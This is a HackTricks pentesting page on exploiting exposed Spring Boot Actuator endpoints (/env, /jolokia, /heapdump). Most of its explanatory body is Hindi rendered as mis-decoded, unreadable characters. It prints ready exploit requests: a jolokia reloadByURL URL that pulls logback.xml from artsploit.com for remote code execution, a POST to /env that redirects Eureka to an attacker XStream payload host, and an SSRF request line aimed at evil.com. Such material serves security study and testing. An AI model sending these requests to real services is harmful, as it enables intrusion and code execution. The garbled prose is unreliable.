# Spring Actuators

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**From** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploiting Spring Boot Actuators

**Check the original post from** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **Key Points:**

* Spring Boot Actuators ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü‡•ç‡§∏ ‡§ú‡•à‡§∏‡•á `/health`, `/trace`, `/beans`, `/env`, ‡§Ü‡§¶‡§ø ‡§ï‡•ã ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ 1 ‡§∏‡•á 1.4 ‡§Æ‡•á‡§Ç, ‡§Ø‡•á ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü‡•ç‡§∏ ‡§¨‡§ø‡§®‡§æ ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡•Ä‡§ï‡§∞‡§£ ‡§ï‡•á ‡§â‡§™‡§≤‡§¨‡•ç‡§ß ‡§π‡•à‡§Ç‡•§ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ 1.5 ‡§∏‡•á ‡§Ü‡§ó‡•á, ‡§ï‡•á‡§µ‡§≤ `/health` ‡§î‡§∞ `/info` ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ó‡•à‡§∞-‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§π‡•à‡§Ç, ‡§≤‡•á‡§ï‡§ø‡§® ‡§°‡•á‡§µ‡§≤‡§™‡§∞‡•ç‡§∏ ‡§Ö‡§ï‡•ç‡§∏‡§∞ ‡§á‡§∏ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡•ã ‡§¨‡§Ç‡§¶ ‡§ï‡§∞ ‡§¶‡•á‡§§‡•á ‡§π‡•à‡§Ç‡•§
* ‡§ï‡•Å‡§õ Actuator ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü‡•ç‡§∏ ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§â‡§ú‡§æ‡§ó‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§Ø‡§æ ‡§π‡§æ‡§®‡§ø‡§ï‡§æ‡§∞‡§ï ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
* `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart`, ‡§î‡§∞ `/heapdump`‡•§
* Spring Boot 1.x ‡§Æ‡•á‡§Ç, ‡§è‡§ï‡•ç‡§ü‡•ç‡§Ø‡•Ç‡§è‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•ã ‡§∞‡•Ç‡§ü URL ‡§ï‡•á ‡§§‡§π‡§§ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§ú‡§¨‡§ï‡§ø 2.x ‡§Æ‡•á‡§Ç, ‡§µ‡•á `/actuator/` ‡§¨‡•á‡§∏ ‡§™‡§æ‡§• ‡§ï‡•á ‡§§‡§π‡§§ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§

### **Exploitation Techniques:**

1. **Remote Code Execution via '/jolokia'**:
* `/jolokia` ‡§è‡§ï‡•ç‡§ü‡•ç‡§Ø‡•Ç‡§è‡§ü‡§∞ ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü ‡§ú‡•ã‡§≤‡•ã‡§ï‡•Ä‡§Ø‡§æ ‡§≤‡§æ‡§á‡§¨‡•ç‡§∞‡•á‡§∞‡•Ä ‡§ï‡•ã ‡§â‡§ú‡§æ‡§ó‡§∞ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã MBeans ‡§§‡§ï HTTP ‡§™‡§π‡•Å‡§Ç‡§ö ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§
* `reloadByURL` ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§≤‡•â‡§ó‡§ø‡§Ç‡§ó ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§ï‡•ã ‡§è‡§ï ‡§¨‡§æ‡§π‡§∞‡•Ä URL ‡§∏‡•á ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡•ã ‡§Ö‡§Ç‡§ß‡•á XXE ‡§Ø‡§æ ‡§ï‡§∏‡•ç‡§ü‡§Æ XML ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§∞‡§ø‡§Æ‡•ã‡§ü ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•Ä ‡§ì‡§∞ ‡§≤‡•á ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§
* ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü URL: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`‡•§
2. **Config Modification via '/env'**:
* ‡§Ø‡§¶‡§ø Spring Cloud Libraries ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à‡§Ç, ‡§§‡•ã `/env` ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü ‡§™‡§∞‡•ç‡§Ø‡§æ‡§µ‡§∞‡§£‡•Ä‡§Ø ‡§ó‡•Å‡§£‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§
* ‡§ó‡•Å‡§£‡•ã‡§Ç ‡§ï‡§æ ‡§π‡•á‡§∞‡§´‡•á‡§∞ ‡§ï‡§∞‡§ï‡•á ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡•à‡§∏‡•á Eureka serviceURL ‡§Æ‡•á‡§Ç XStream deserialization vulnerability‡•§
*   ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü POST ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **Other Useful Settings**:
* ‡§ó‡•Å‡§£ ‡§ú‡•à‡§∏‡•á `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url`, ‡§î‡§∞ `spring.datasource.tomcat.max-active` ‡§ï‡•ã ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü‡•ç‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§π‡•á‡§∞‡§´‡•á‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§ú‡•à‡§∏‡•á SQL injection ‡§Ø‡§æ ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó‡•ç‡§∏ ‡§ï‡•ã ‡§¨‡§¶‡§≤‡§®‡§æ‡•§

### **Additional Information:**

* ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§è‡§ï‡•ç‡§ü‡•ç‡§Ø‡•Ç‡§è‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•Ä ‡§è‡§ï ‡§µ‡•ç‡§Ø‡§æ‡§™‡§ï ‡§∏‡•Ç‡§ö‡•Ä [‡§Ø‡§π‡§æ‡§Ç](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt) ‡§™‡§æ‡§à ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§
* Spring Boot 2.x ‡§Æ‡•á‡§Ç `/env` ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü ‡§ó‡•Å‡§£ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§® ‡§ï‡•á ‡§≤‡§ø‡§è JSON ‡§™‡•ç‡§∞‡§æ‡§∞‡•Ç‡§™ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§Ö‡§µ‡§ß‡§æ‡§∞‡§£‡§æ ‡§∏‡§Æ‡§æ‡§® ‡§∞‡§π‡§§‡•Ä ‡§π‡•à‡•§

### **Related Topics:**

1. **Env + H2 RCE**:
* `/env` ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü ‡§î‡§∞ H2 ‡§°‡•á‡§ü‡§æ‡§¨‡•á‡§∏ ‡§ï‡•á ‡§∏‡§Ç‡§Ø‡•ã‡§ú‡§® ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§®‡•á ‡§ï‡•á ‡§µ‡§ø‡§µ‡§∞‡§£ [‡§Ø‡§π‡§æ‡§Ç](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database) ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§
2. **SSRF on Spring Boot Through Incorrect Pathname Interpretation**:
* HTTP ‡§™‡§• ‡§®‡§æ‡§Æ‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§Æ‡•à‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ (`;`) ‡§ï‡•á ‡§π‡•à‡§Ç‡§°‡§≤‡§ø‡§Ç‡§ó ‡§ï‡§æ Spring ‡§´‡•ç‡§∞‡•á‡§Æ‡§µ‡§∞‡•ç‡§ï ‡§∏‡§∞‡•ç‡§µ‡§∞-‡§∏‡§æ‡§á‡§° ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ß‡•ã‡§ñ‡§æ‡§ß‡§°‡§º‡•Ä (SSRF) ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∂‡•ã‡§∑‡§£ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§
*   ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
